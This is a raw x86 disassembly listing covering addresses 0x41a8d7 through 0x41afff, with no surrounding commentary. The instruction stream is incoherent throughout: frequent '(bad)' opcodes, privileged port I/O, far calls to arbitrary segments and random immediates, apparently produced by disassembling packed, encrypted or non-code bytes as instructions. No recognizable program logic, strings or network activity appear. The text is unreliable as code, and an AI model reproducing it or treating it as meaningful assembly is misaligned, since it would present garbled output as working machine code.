  41a8d7:	xlat   BYTE PTR ds:[ebx]
  41a8d8:	in     al,dx
  41a8d9:	xchg   edi,eax
  41a8da:	push   edx
  41a8db:	pushf  
  41a8dc:	mov    al,ds:0x70929605
  41a8e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8e2:	push   esp
  41a8e3:	mov    ebx,DWORD PTR [ecx]
  41a8e5:	ins    BYTE PTR es:[di],dx
  41a8e7:	(bad)  [eax+0x6c]
  41a8ea:	out    dx,eax
  41a8eb:	lock ds pop esp
  41a8ee:	ds cmp ax,0xe57b
  41a8f3:	dec    esi
  41a8f4:	sti    
  41a8f5:	das    
  41a8f6:	push   0x943931e
  41a8fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8fc:	xor    eax,0x44101e48
  41a901:	outs   dx,DWORD PTR ds:[esi]
  41a902:	mov    ah,0xcc
  41a904:	push   es
  41a905:	push   ecx
  41a906:	aam    0xcc
  41a908:	call   DWORD PTR [eax]
  41a90a:	aad    0x64
  41a90c:	push   es
  41a90d:	inc    esi
  41a90e:	dec    ebx
  41a90f:	faddp  st(0),st
  41a911:	mov    ds:0xb80c948f,al
  41a916:	mov    ds:0x87f2768a,al
  41a91b:	mov    edi,0xa1da4f02
  41a920:	pop    ecx
  41a921:	aas    
  41a922:	or     eax,0x3a174416
  41a927:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a928:	mov    esp,0x92e5b5ca
  41a92d:	scas   eax,DWORD PTR es:[edi]
  41a92e:	inc    edx
  41a92f:	psubw  mm5,mm5
  41a932:	call   0x90cffa8
  41a937:	stc    
  41a938:	sub    DWORD PTR [esi-0x67],esi
  41a93b:	push   esi
  41a93c:	adc    eax,0xcc36fe32
  41a941:	xor    DWORD PTR [ebp+0x2a04f2ae],edi
  41a947:	push   ecx
  41a948:	push   0xc03d54bb
  41a94d:	xor    al,0x6
  41a94f:	dec    ebp
  41a950:	ins    DWORD PTR es:[edi],dx
  41a951:	cwde   
  41a952:	xchg   esi,eax
  41a953:	push   0x6a
  41a955:	mov    al,BYTE PTR [eax+eiz*4-0x678c9f4f]
  41a95c:	out    dx,al
  41a95d:	sbb    eax,0xe6cd4f7a
  41a962:	cmc    
  41a963:	mov    ebx,0xd2f383fe
  41a968:	push   esp
  41a969:	rol    DWORD PTR [ebp-0xc],1
  41a96c:	pop    ebp
  41a96d:	pop    ds
  41a96e:	repz jp 0x41a982
  41a971:	cmp    bh,BYTE PTR [ebx-0x69]
  41a974:	xchg   edx,eax
  41a975:	mov    edx,0x2bf68cca
  41a97a:	ins    BYTE PTR es:[edi],dx
  41a97b:	cli    
  41a97c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a97d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a97e:	xor    BYTE PTR [esi],bh
  41a980:	nop
  41a981:	mov    DWORD PTR [edi+0x4f401a4c],esi
  41a987:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a988:	mov    bl,0xb8
  41a98a:	sar    ch,1
  41a98c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a98d:	inc    esi
  41a98e:	jo     0x41a94c
  41a990:	ds mov dh,0x68
  41a993:	sbb    DWORD PTR [ebx+eax*8-0x68],ebp
  41a997:	aad    0x44
  41a999:	(bad)  
  41a99a:	(bad)  
  41a99b:	fimul  DWORD PTR [ebp+0x568af979]
  41a9a1:	pop    ss
  41a9a2:	fcomp  st(0)
  41a9a4:	inc    esp
  41a9a5:	inc    ecx
  41a9a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9a7:	or     BYTE PTR [ebx+0x21],0x67
  41a9ab:	icebp  
  41a9ac:	out    dx,al
  41a9ad:	je     0x41a956
  41a9af:	mov    eax,ds:0x155bec48
  41a9b4:	and    DWORD PTR [edx-0x2e],0xe61cfee7
  41a9bb:	mov    DWORD PTR [edx+0x13],eax
  41a9be:	in     eax,0xbd
  41a9c0:	sub    edx,DWORD PTR [ebp-0x1]
  41a9c3:	(bad)  
  41a9c4:	fadd   st,st(1)
  41a9c6:	inc    eax
  41a9c7:	jnp    0x41aa26
  41a9c9:	cmp    DWORD PTR [ebp-0x1a],0x55266e89
  41a9d0:	mov    esp,0xfc5cb2ab
  41a9d5:	out    dx,eax
  41a9d6:	inc    ebx
  41a9d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9d8:	outs   dx,DWORD PTR ds:[esi]
  41a9d9:	test   eax,0x2e17c8fc
  41a9de:	stos   DWORD PTR es:[edi],eax
  41a9df:	dec    ebx
  41a9e0:	mov    al,BYTE PTR [ebx+0x7a9caab9]
  41a9e6:	adc    esi,DWORD PTR [edx]
  41a9e8:	add    cl,BYTE PTR [edi+0x4b]
  41a9eb:	jae    0x41a9c3
  41a9ed:	inc    esi
  41a9ee:	add    BYTE PTR [edx],0xbd
  41a9f1:	loope  0x41aa62
  41a9f3:	xchg   DWORD PTR [esp+edx*2-0x7f],edi
  41a9f7:	or     al,dh
  41a9f9:	sti    
  41a9fa:	mov    edx,0x17afa3d2
  41a9ff:	loop   0x41aa3e
  41aa01:	cmp    bh,BYTE PTR [edi+0xaa49661]
  41aa07:	(bad)
  41aa0b:	push   cs
  41aa0c:	outs   dx,BYTE PTR ds:[esi]
  41aa0d:	jne    0x41aa7c
  41aa0f:	data16 sbb dl,BYTE PTR [edi+0xc49c161]
  41aa16:	imul   DWORD PTR [edi]
  41aa18:	ds xchg ebx,eax
  41aa1a:	hlt    
  41aa1b:	test   eax,0xa47d990b
  41aa20:	add    al,0x9
  41aa23:	mov    edi,DWORD PTR [edi+0x5b8f5bad]
  41aa29:	ret    0x1e7a
  41aa2c:	test   BYTE PTR [bp+si-0x5f],ch
  41aa30:	or     DWORD PTR [edx-0x753e27c1],ebx
  41aa36:	xchg   ebx,eax
  41aa37:	inc    esi
  41aa38:	repnz pop edi
  41aa3a:	or     ebp,edi
  41aa3c:	mov    esp,0x272b39f8
  41aa41:	inc    esp
  41aa42:	ror    BYTE PTR [edx-0x62],cl
  41aa45:	mov    eax,ds:0xcdd8c93f
  41aa4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa4b:	xor    al,0x6
  41aa4d:	mov    eax,ds:0x41acaf1a
  41aa52:	mov    bl,BYTE PTR [edi-0x31]
  41aa55:	mov    bh,BYTE PTR [ecx-0x534fbb9c]
  41aa5b:	mov    edi,0x82f2974b
  41aa60:	inc    ecx
  41aa61:	enter  0x6385,0x9a
  41aa65:	ds mov ecx,0xd11635a0
  41aa6b:	arpl   WORD PTR [ebp+0x14],cx
  41aa6e:	push   eax
  41aa6f:	ins    BYTE PTR es:[edi],dx
  41aa70:	xorps  xmm5,XMMWORD PTR [ebx]
  41aa73:	lods   al,BYTE PTR ds:[esi]
  41aa74:	fsub   QWORD PTR [edx+0x2e6d8033]
  41aa7a:	sbb    eax,0x35faf14d
  41aa7f:	push   ss
  41aa80:	(bad)  
  41aa81:	adc    DWORD PTR [edx+0x24],ecx
  41aa84:	mov    bh,0xcd
  41aa86:	fdiv   st,st(2)
  41aa88:	in     al,dx
  41aa89:	mov    edi,0x9a105731
  41aa8e:	mov    dh,0xd8
  41aa90:	std    
  41aa91:	adc    esp,DWORD PTR [edi-0x40]
  41aa94:	test   eax,0xdccec800
  41aa99:	fbld   TBYTE PTR [eax]
  41aa9b:	ss push edx
  41aa9d:	inc    ebx
  41aa9e:	push   esi
  41aa9f:	fld    DWORD PTR [ecx]
  41aaa1:	jns    0x41aa8d
  41aaa3:	rcr    DWORD PTR [esi+0x77],1
  41aaa6:	lds    ebp,FWORD PTR [edx+0x4c]
  41aaa9:	or     eax,0x806cf718
  41aaae:	sub    esi,ecx
  41aab0:	xchg   esp,eax
  41aab1:	loopne 0x41aa89
  41aab3:	test   eax,0xe99c8235
  41aab8:	push   eax
  41aab9:	fstp   QWORD PTR [ebx-0x568cc0cb]
  41aabf:	icebp  
  41aac0:	push   ss
  41aac1:	sub    bl,BYTE PTR [edx-0x50]
  41aac4:	lahf   
  41aac5:	jp     0x41ab26
  41aac7:	clc    
  41aac8:	iret   
  41aac9:	inc    ebp
  41aaca:	rcl    BYTE PTR [ebx+0x40e2ad5d],cl
  41aad0:	mov    ch,0xa9
  41aad2:	test   DWORD PTR [ebx+0x1c],ebx
  41aad5:	ret    
  41aad6:	adc    DWORD PTR [esi],ebx
  41aad8:	test   eax,0x92231c0f
  41aadd:	pop    ds
  41aade:	inc    ebp
  41aadf:	call   FWORD PTR [edi]
  41aae1:	xchg   esi,eax
  41aae2:	mov    eax,ds:0x2f373814
  41aae7:	push   ds
  41aae8:	adc    esp,eax
  41aaea:	mov    esp,0x6a7f3d3c
  41aaef:	aaa    
  41aaf0:	dec    esp
  41aaf1:	ret    
  41aaf2:	call   FWORD PTR [ebp+0x3d]
  41aaf5:	pop    ecx
  41aaf6:	outs   dx,BYTE PTR ds:[esi]
  41aaf7:	lods   al,BYTE PTR ds:[esi]
  41aaf8:	inc    edi
  41aaf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aafa:	cwde   
  41aafb:	jbe    0x41aa9c
  41aafd:	pop    edx
  41aafe:	sbb    ah,dl
  41ab00:	push   ebx
  41ab01:	cmc    
  41ab02:	sbb    ecx,ebp
  41ab04:	int3   
  41ab05:	das    
  41ab06:	lods   eax,DWORD PTR ds:[esi]
  41ab07:	add    BYTE PTR [ecx+0x5e],dh
  41ab0a:	in     al,dx
  41ab0b:	addr16 jge 0x41aad2
  41ab0e:	and    BYTE PTR [ebx-0x58011834],ch
  41ab14:	enter  0xc7e7,0x9b
  41ab18:	and    al,0x6c
  41ab1a:	mov    ch,BYTE PTR [ebx-0x6e]
  41ab1d:	data16 loope 0x41aad1
  41ab20:	cdq    
  41ab21:	call   0x74a8:0x904b60ae
  41ab28:	sub    al,0xeb
  41ab2a:	mov    DWORD PTR [ebx],ecx
  41ab2c:	dec    esi
  41ab2d:	xor    eax,edi
  41ab2f:	test   al,0x88
  41ab31:	pop    ecx
  41ab32:	inc    esp
  41ab33:	imul   DWORD PTR [edx]
  41ab35:	and    bl,BYTE PTR [ebx-0x79]
  41ab38:	pop    ebx
  41ab39:	cmp    eax,0xd0231269
  41ab3e:	push   edx
  41ab3f:	mov    esp,DWORD PTR [ecx-0x2]
  41ab42:	or     edi,ecx
  41ab44:	scas   al,BYTE PTR es:[edi]
  41ab45:	cmp    ebx,edx
  41ab47:	in     eax,0xa4
  41ab49:	imul   esi,DWORD PTR [eax],0xffffffd0
  41ab4c:	nop
  41ab4d:	call   0x8eab:0xdf200458
  41ab54:	cli    
  41ab55:	push   es
  41ab56:	sub    DWORD PTR [esi-0x46487541],ebp
  41ab5c:	aas    
  41ab5d:	dec    esi
  41ab5e:	frstor [bx]
  41ab61:	or     ebp,ebx
  41ab63:	dec    edi
  41ab64:	loope  0x41ab3e
  41ab66:	leave  
  41ab67:	xchg   BYTE PTR [esi-0x63c73d2a],dl
  41ab6d:	es pop edi
  41ab6f:	push   edx
  41ab70:	mov    ebx,0x5e13fda1
  41ab75:	popa   
  41ab76:	test   al,0xbd
  41ab78:	repnz dec esp
  41ab7a:	mov    esp,eax
  41ab7c:	lea    edx,[ebx]
  41ab7e:	add    BYTE PTR [edx+0xd],cl
  41ab81:	fdivr  DWORD PTR [ecx-0x30]
  41ab84:	test   ecx,esi
  41ab86:	push   eax
  41ab88:	call   0x2133:0xd8c09e66
  41ab8f:	shl    BYTE PTR [ebx+0xb091721],1
  41ab95:	stos   BYTE PTR es:[edi],al
  41ab96:	and    DWORD PTR [edx+edi*8],ebp
  41ab99:	imul   esi,esi,0x7e
  41ab9c:	movnti DWORD PTR [esi-0x78],edi
  41aba0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aba1:	cmp    BYTE PTR [ecx],0xc7
  41aba4:	jg     0x41abb5
  41aba6:	mov    eax,0x5ba20328
  41abab:	scas   eax,DWORD PTR es:[edi]
  41abac:	fwait
  41abad:	dec    ebp
  41abae:	clc    
  41abaf:	popf   
  41abb0:	pusha  
  41abb1:	xchg   esi,eax
  41abb2:	ds jnp 0x41abd6
  41abb5:	mov    bh,0x57
  41abb7:	jae    0x41ab87
  41abb9:	push   ebp
  41abba:	pop    esi
  41abbb:	dec    esp
  41abbc:	dec    ebp
  41abbd:	cmc    
  41abbe:	jno    0x41abb4
  41abc0:	das    
  41abc1:	mov    dl,0x3c
  41abc3:	cli    
  41abc4:	outs   dx,BYTE PTR ds:[esi]
  41abc5:	ss sti 
  41abc7:	lods   eax,DWORD PTR ds:[esi]
  41abc8:	fnstenv [ebp+0x2b1d357c]
  41abce:	test   eax,0x96e38a0b
  41abd3:	mov    bh,0x4f
  41abd5:	cmp    eax,0xb8fb633
  41abda:	push   fs
  41abdc:	addr16 xor al,0x1b
  41abdf:	push   ds
  41abe0:	cmp    DWORD PTR [ecx-0x17],ecx
  41abe3:	fcom   DWORD PTR [edx-0x14]
  41abe6:	add    ah,BYTE PTR ds:0x55d1882
  41abec:	dec    ecx
  41abed:	aas    
  41abee:	add    al,BYTE PTR [ecx]
  41abf0:	(bad)  
  41abf1:	in     al,dx
  41abf2:	sahf   
  41abf3:	dec    edx
  41abf4:	jnp    0x41ac2b
  41abf6:	cmp    al,0x6a
  41abf8:	fimul  DWORD PTR [edi]
  41abfa:	aas    
  41abfb:	ret    
  41abfc:	mov    ds:0xe27411cd,al
  41ac01:	push   edx
  41ac02:	mov    edi,0x4d14ebdc
  41ac07:	je     0x41ac37
  41ac09:	stos   DWORD PTR es:[edi],eax
  41ac0a:	or     ch,BYTE PTR [edi+0x3d]
  41ac0d:	gs xchg ecx,eax
  41ac0f:	call   0x43f7ea45
  41ac14:	ret    
  41ac15:	and    al,0x4f
  41ac17:	push   ds
  41ac18:	xor    BYTE PTR [edi+0x44],cl
  41ac1b:	jge    0x41ac24
  41ac1d:	call   0xa3b65c37
  41ac22:	mov    ds:0x6d17cfdc,al
  41ac27:	ja     0x41ac09
  41ac29:	in     al,dx
  41ac2a:	push   es
  41ac2b:	cmc    
  41ac2c:	sub    al,0xaf
  41ac2e:	scas   eax,DWORD PTR es:[edi]
  41ac2f:	call   0x2a42:0x9f7e0143
  41ac36:	sub    al,0x81
  41ac38:	dec    ebx
  41ac39:	(bad)  
  41ac3a:	push   esi
  41ac3b:	(bad)  
  41ac3c:	imul   esi,DWORD PTR [ebx],0x65a9c984
  41ac42:	gs pop ds
  41ac44:	clc    
  41ac45:	mov    al,BYTE PTR [ebp-0x65]
  41ac48:	pop    es
  41ac49:	dec    edi
  41ac4a:	dec    esi
  41ac4b:	setb   BYTE PTR [ebx+0x4aa6d143]
  41ac52:	pop    eax
  41ac53:	sub    ebx,edx
  41ac55:	xlat   BYTE PTR ds:[ebx]
  41ac56:	stos   DWORD PTR es:[edi],eax
  41ac57:	shl    DWORD PTR [ebx+0x6283c73],1
  41ac5d:	cli    
  41ac5e:	(bad)  
  41ac5f:	jg     0x41abe5
  41ac61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac62:	cs dec ebx
  41ac64:	mov    WORD PTR [ecx+0x10],?
  41ac67:	lock fbld TBYTE PTR [esi-0x33]
  41ac6b:	(bad)  
  41ac6c:	das    
  41ac6d:	aad    0x28
  41ac6f:	add    BYTE PTR [ecx-0x120c3321],dh
  41ac75:	jp     0x41acf6
  41ac77:	push   ds
  41ac78:	fild   DWORD PTR ds:0x72f1fdc7
  41ac7e:	mov    dl,BYTE PTR [eax]
  41ac80:	jne    0x41acab
  41ac82:	out    0xf8,al
  41ac84:	jmp    0xfc95:0xce080a5a
  41ac8b:	mov    eax,DWORD PTR [ebx+0x7b]
  41ac8e:	sbb    DWORD PTR [eax+0x70d7bafc],edi
  41ac94:	data16 sbb al,0xfe
  41ac97:	test   BYTE PTR [ebp-0x134582c5],0x1e
  41ac9e:	cmp    ah,cl
  41aca0:	add    ch,BYTE PTR [ebp+0x17]
  41aca3:	lock pop ecx
  41aca5:	rol    esi,0xf4
  41aca8:	cmp    al,0x5a
  41acaa:	(bad)  [ebp-0x4e]
  41acad:	inc    ebp
  41acae:	fstp   DWORD PTR [ecx+ebx*1-0x53]
  41acb2:	clc    
  41acb3:	mov    eax,0x171e7cd3
  41acb8:	push   esi
  41acb9:	sbb    al,0x22
  41acbb:	pop    esp
  41acbc:	stc    
  41acbd:	mov    esp,0x42b75754
  41acc2:	call   0x8ee1:0x8f339f67
  41acc9:	xchg   edx,eax
  41acca:	(bad)  
  41accb:	sbb    edi,esp
  41accd:	or     DWORD PTR [bx+di+0x4e78],edi
  41acd2:	dec    ebx
  41acd3:	(bad)  
  41acd4:	ror    ebp,1
  41acd6:	cmp    eax,DWORD PTR [edi-0x1c]
  41acd9:	cld    
  41acda:	cmp    eax,0x8c7180b8
  41acdf:	retf   
  41ace0:	iret   
  41ace1:	xchg   edi,eax
  41ace2:	mov    ds:0x1cc0316d,eax
  41ace7:	leave  
  41ace8:	push   ss
  41ace9:	xor    BYTE PTR [edi+0x4a],ah
  41acec:	vmwrite ebp,DWORD PTR [eax-0x2614d682]
  41acf3:	out    0x60,eax
  41acf5:	pop    edi
  41acf6:	jb     0x41ad49
  41acf8:	aas    
  41acf9:	clc    
  41acfa:	into   
  41acfb:	fisub  DWORD PTR [edi]
  41acfd:	rol    DWORD PTR ds:0xc1d7c6fe,0x4f
  41ad04:	cmp    al,0x30
  41ad06:	mov    DWORD PTR [ecx],esp
  41ad08:	add    bl,BYTE PTR [ebp+0x71]
  41ad0b:	mov    al,0xda
  41ad0d:	sbb    DWORD PTR [edi+0x681d5d7],esi
  41ad13:	div    BYTE PTR [esi+0x739572e2]
  41ad19:	ins    BYTE PTR es:[edi],dx
  41ad1a:	cmp    cl,BYTE PTR [ecx-0x4d]
  41ad1d:	sbb    BYTE PTR [ebx-0x3462737e],dl
  41ad23:	push   ebx
  41ad24:	adc    dl,BYTE PTR [ebp-0x51]
  41ad27:	std    
  41ad28:	ja     0x41ad71
  41ad2a:	mov    edx,0x28ea59c1
  41ad2f:	sbb    BYTE PTR [edx-0x4f2184df],0x1
  41ad36:	lahf   
  41ad37:	sbb    BYTE PTR [esp+edx*4+0x0],al
  41ad3b:	xchg   BYTE PTR [ebp-0x201f2ae4],al
  41ad41:	shr    DWORD PTR [ebx+0x3df18937],0xd3
  41ad48:	repnz xor cl,0xdb
  41ad4c:	imul   edi,DWORD PTR [ebp+0x39],0x7b
  41ad50:	xchg   esi,eax
  41ad51:	mov    al,dh
  41ad53:	pop    ebx
  41ad54:	fisttp DWORD PTR [edi-0x48321e12]
  41ad5a:	xchg   ebx,eax
  41ad5b:	(bad)  
  41ad5c:	lods   al,BYTE PTR ds:[esi]
  41ad5d:	sahf   
  41ad5e:	jmp    0xdd87:0x15a87f45
  41ad65:	jne    0x41ad2d
  41ad67:	mov    DWORD PTR [ebx-0x2e],esi
  41ad6a:	jmp    0x41ad76
  41ad6c:	cli    
  41ad6d:	xor    al,bl
  41ad6f:	ror    DWORD PTR [edx-0x7f5d115c],1
  41ad75:	sub    al,0xf9
  41ad77:	ficomp WORD PTR [eax-0x44]
  41ad7a:	pusha  
  41ad7b:	les    ebp,FWORD PTR [ecx]
  41ad7d:	scas   eax,DWORD PTR es:[edi]
  41ad7e:	adc    bl,BYTE PTR [edi]
  41ad80:	xchg   ebp,eax
  41ad81:	and    bh,cl
  41ad83:	scas   al,BYTE PTR es:[edi]
  41ad84:	add    dh,BYTE PTR [ebx]
  41ad86:	sti    
  41ad87:	sub    esi,edi
  41ad89:	mov    al,0xef
  41ad8b:	les    edx,FWORD PTR [esi+0x26]
  41ad8e:	cwde   
  41ad8f:	jne    0x41ade5
  41ad91:	push   esp
  41ad92:	xor    ebx,DWORD PTR [ebx]
  41ad94:	out    dx,al
  41ad95:	(bad)  
  41ad96:	lods   al,BYTE PTR ds:[esi]
  41ad97:	xchg   esi,eax
  41ad98:	call   0x33e5:0x1e14eef4
  41ad9f:	call   0x64eb:0xd3c68d8
  41ada6:	clc    
  41ada7:	cli    
  41ada8:	jb     0x41ae19
  41adaa:	or     eax,0xe9946ced
  41adaf:	xchg   edi,eax
  41adb0:	cld    
  41adb1:	xor    ch,dl
  41adb3:	test   eax,0x3eaf35ea
  41adb8:	sbb    eax,edi
  41adba:	and    esi,DWORD PTR [eax]
  41adbc:	sub    DWORD PTR [ebp+0xc],eax
  41adbf:	imul   ecx,DWORD PTR [eax+ebx*8+0x632eb65c],0x53
  41adc7:	mov    al,ds:0x5806f9f2
  41adcc:	and    al,0xdc
  41adce:	push   edi
  41adcf:	or     cl,BYTE PTR [edx]
  41add1:	repz les eax,FWORD PTR [eax+ebx*1]
  41add5:	pop    ebp
  41add6:	mov    ebp,ds
  41add8:	xor    bh,ch
  41adda:	xor    edx,ebp
  41addc:	push   ss
  41addd:	das    
  41adde:	and    BYTE PTR [esi+0x75],dl
  41ade1:	jnp    0x41ae03
  41ade3:	fs add ebx,ebp
  41ade6:	paddd  mm1,QWORD PTR [edx]
  41ade9:	mov    esi,0x6ee060d8
  41adee:	mov    bh,0x64
  41adf0:	pop    edx
  41adf1:	and    al,0x65
  41adf3:	gs (bad) 
  41adf5:	ds push esi
  41adf7:	je     0x41addd
  41adf9:	pushf  
  41adfa:	(bad)  
  41adfb:	push   ss
  41adfc:	(bad)  
  41adfd:	std    
  41adfe:	jmp    0x86dbf19a
  41ae03:	xor    esi,0x5d
  41ae06:	ins    BYTE PTR es:[edi],dx
  41ae07:	leave  
  41ae08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae09:	loopne 0x41ae6a
  41ae0b:	inc    edi
  41ae0c:	pop    edx
  41ae0d:	fs push ds
  41ae0f:	call   0xb85259ba
  41ae14:	xchg   BYTE PTR [ecx],bh
  41ae16:	scas   al,BYTE PTR es:[edi]
  41ae17:	ss inc ebx
  41ae19:	sbb    al,BYTE PTR ds:0x9e5cb6d6
  41ae1f:	mov    ah,0x43
  41ae21:	dec    esp
  41ae22:	stos   DWORD PTR es:[edi],eax
  41ae23:	cmp    ch,BYTE PTR [ebp-0x34]
  41ae26:	inc    ebp
  41ae27:	dec    edi
  41ae28:	and    DWORD PTR [eax+0x6d],ebx
  41ae2b:	mov    DWORD PTR [ebp+ebx*1-0xbd11f1a],ebx
  41ae32:	mov    edi,0x195ddaf3
  41ae37:	pop    es
  41ae38:	into   
  41ae39:	cmp    ch,BYTE PTR [eax-0x76fa8a57]
  41ae3f:	add    ecx,edi
  41ae41:	sub    ch,BYTE PTR [ecx]
  41ae43:	in     eax,dx
  41ae44:	sbb    eax,0x3b923096
  41ae49:	fild   QWORD PTR [edx-0x4622ebc0]
  41ae4f:	xchg   edx,eax
  41ae50:	cmp    BYTE PTR [eax+0x56],cl
  41ae53:	sbb    al,0x43
  41ae55:	xchg   ebp,eax
  41ae56:	cmc    
  41ae57:	fwait
  41ae58:	cmp    dl,BYTE PTR [esi+0x6afb5792]
  41ae5e:	sbb    al,0x55
  41ae60:	nop
  41ae61:	push   es
  41ae62:	in     eax,0x12
  41ae64:	ja     0x41ae7b
  41ae66:	push   edx
  41ae67:	xchg   edi,eax
  41ae68:	fstp   QWORD PTR [ebx]
  41ae6a:	push   esi
  41ae6b:	cmp    bl,ch
  41ae6d:	pushf  
  41ae6e:	and    BYTE PTR [edi+ebp*1-0x2c],bh
  41ae72:	jecxz  0x41ae82
  41ae74:	(bad)  
  41ae75:	mov    edx,edi
  41ae77:	popa   
  41ae78:	daa    
  41ae79:	(bad)  
  41ae7a:	or     DWORD PTR [ebx],edx
  41ae7c:	pop    ss
  41ae7d:	mov    ebx,DWORD PTR [eax+0x22]
  41ae80:	sahf   
  41ae81:	push   ds
  41ae82:	in     al,0x1d
  41ae84:	leave  
  41ae85:	xor    ebp,DWORD PTR [edx+0x36]
  41ae88:	jge    0x41ae23
  41ae8a:	cwde   
  41ae8b:	fistp  QWORD PTR [esi+0x627e5f52]
  41ae91:	inc    edi
  41ae92:	push   eax
  41ae93:	cmc    
  41ae94:	mov    dl,0xc0
  41ae96:	pop    ebx
  41ae98:	ret    
  41ae99:	lahf   
  41ae9a:	mov    esp,0xa6a6a1d9
  41ae9f:	call   0x6e778b25
  41aea4:	mov    esp,0x52826393
  41aea9:	and    ebx,DWORD PTR [ecx-0x78f56e66]
  41aeaf:	mov    cl,BYTE PTR [ebx-0x18]
  41aeb2:	test   eax,0x4ee76fa1
  41aeb7:	push   edi
  41aeb8:	sbb    eax,0x824fa421
  41aebd:	cli    
  41aebe:	ins    DWORD PTR es:[edi],dx
  41aebf:	mov    esi,0xdb5246e3
  41aec4:	sbb    edx,DWORD PTR fs:[ecx-0x41f864a9]
  41aecb:	int3   
  41aecc:	mov    edi,0x30a59ba6
  41aed1:	mov    edi,0x8aea2de9
  41aed6:	test   BYTE PTR [ebp-0x33],0x7
  41aeda:	xchg   esi,eax
  41aedb:	mov    al,0x7c
  41aedd:	fnsave [eax]
  41aedf:	sbb    dh,BYTE PTR [ebx+0x25]
  41aee2:	pusha  
  41aee3:	fs pop edx
  41aee5:	outs   dx,BYTE PTR ds:[esi]
  41aee6:	mov    esp,0xa7797adc
  41aeeb:	stos   DWORD PTR es:[edi],eax
  41aeec:	push   ebx
  41aeed:	fiadd  WORD PTR [edi+ebp*8]
  41aef0:	inc    ecx
  41aef1:	gs jl  0x41ae99
  41aef4:	sub    DWORD PTR [eax],edx
  41aef6:	pop    edi
  41aef7:	stos   DWORD PTR es:[edi],eax
  41aef8:	(bad)  
  41aefa:	mov    DWORD PTR [ebp+0x3f319640],eax
  41af00:	xchg   edi,eax
  41af01:	mov    bh,0x52
  41af03:	(bad)  
  41af04:	in     eax,0x11
  41af06:	xchg   edi,eax
  41af07:	push   esp
  41af08:	rcl    BYTE PTR [ecx+0x25],1
  41af0b:	js     0x41aed3
  41af0d:	xor    BYTE PTR [esi],bl
  41af0f:	lds    eax,FWORD PTR [edx+0x22]
  41af12:	test   BYTE PTR [eax],dh
  41af14:	cdq    
  41af15:	xchg   esi,eax
  41af16:	push   cs
  41af17:	add    ecx,DWORD PTR [edx]
  41af19:	jle    0x41af89
  41af1b:	test   al,0x7f
  41af1d:	mov    ch,0x32
  41af1f:	add    DWORD PTR [eax+0x480c8506],ebx
  41af25:	sub    eax,0x1b8b3c87
  41af2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af2b:	arpl   si,bx
  41af2d:	sub    DWORD PTR [esi+0x12247b89],edi
  41af33:	(bad)  
  41af34:	(bad)  
  41af35:	mov    bl,0x20
  41af37:	xor    BYTE PTR [eax],0x8f
  41af3a:	mov    dl,0x11
  41af3c:	xchg   esi,eax
  41af3d:	sub    BYTE PTR [esp+eiz*8-0x72],cl
  41af41:	push   ebx
  41af42:	xchg   edi,eax
  41af43:	mov    BYTE PTR ds:0xf0987324,dl
  41af49:	pop    esi
  41af4a:	into   
  41af4b:	adc    BYTE PTR [eax],ch
  41af4d:	push   ebx
  41af4e:	and    dl,BYTE PTR [eax-0x79]
  41af51:	xchg   esp,eax
  41af52:	arpl   WORD PTR [eax+0x52229962],sp
  41af58:	sbb    al,BYTE PTR [ebx+0x60]
  41af5b:	or     ch,BYTE PTR [eax-0x5a736a0a]
  41af61:	inc    edi
  41af62:	adc    esi,DWORD PTR [ecx]
  41af64:	cmc    
  41af65:	add    eax,0x46e4c9fe
  41af6a:	jns    0x41af5a
  41af6c:	push   0x4f
  41af6e:	inc    edx
  41af6f:	cld    
  41af70:	and    DWORD PTR [edx+ecx*1-0x542cccc9],ebp
  41af77:	xchg   edx,eax
  41af78:	das    
  41af79:	test   eax,0x57ad4b06
  41af7e:	xor    BYTE PTR [ecx+eiz*2+0x4c00c3fe],dh
  41af85:	push   ebx
  41af86:	jp     0x41af3f
  41af88:	mov    dh,0xe5
  41af8a:	mov    ds:0x95f86ef2,al
  41af8f:	pop    esi
  41af90:	(bad)  
  41af91:	idiv   DWORD PTR [esi]
  41af93:	or     al,0x16
  41af95:	fidivr DWORD PTR [edi+0x10d39bc7]
  41af9b:	push   ds
  41af9c:	jnp    0x41b001
  41af9e:	cwde   
  41af9f:	sbb    eax,0xee9d58bf
  41afa4:	scas   al,BYTE PTR es:[edi]
  41afa5:	pop    edx
  41afa6:	xchg   ebp,eax
  41afa7:	sbb    DWORD PTR [edx-0x52],0xffffffe3
  41afab:	aam    0x1
  41afad:	cmp    DWORD PTR [ebx+0x29],0x19
  41afb1:	inc    edi
  41afb2:	popa   
  41afb3:	push   edx
  41afb4:	lods   al,BYTE PTR ds:[esi]
  41afb5:	cmp    ebx,ebx
  41afb7:	sub    DWORD PTR [ebx+eiz*1+0x56],0x5f5ae6bc
  41afbf:	imul   ebx,ebp,0x7965c657
  41afc5:	dec    eax
  41afc6:	mov    edx,0x6dcaa37f
  41afcb:	popa   
  41afcc:	(bad)  
  41afcd:	mov    edi,0x7856925a
  41afd2:	jecxz  0x41b013
  41afd4:	adc    al,0x75
  41afd6:	add    eax,0xf9301a57
  41afdb:	loopne 0x41b05c
  41afdd:	dec    edx
  41afde:	aaa    
  41afdf:	mov    bl,0x10
  41afe1:	mov    esi,ebx
  41afe3:	and    DWORD PTR [esi-0x3fbadc75],esi
  41afe9:	dec    eax
  41afea:	into   
  41afeb:	imul   ecx,ebp,0x2e
  41afee:	nop
  41afef:	add    al,0xe4
  41aff1:	xchg   esi,eax
  41aff2:	cdq    
  41aff3:	dec    ebx
  41aff4:	sahf   
  41aff5:	mov    DWORD PTR [ecx-0x1a],0xa5088596
  41affc:	pop    esi
  41affd:	fistp  DWORD PTR [edx]
  41afff:	cld    
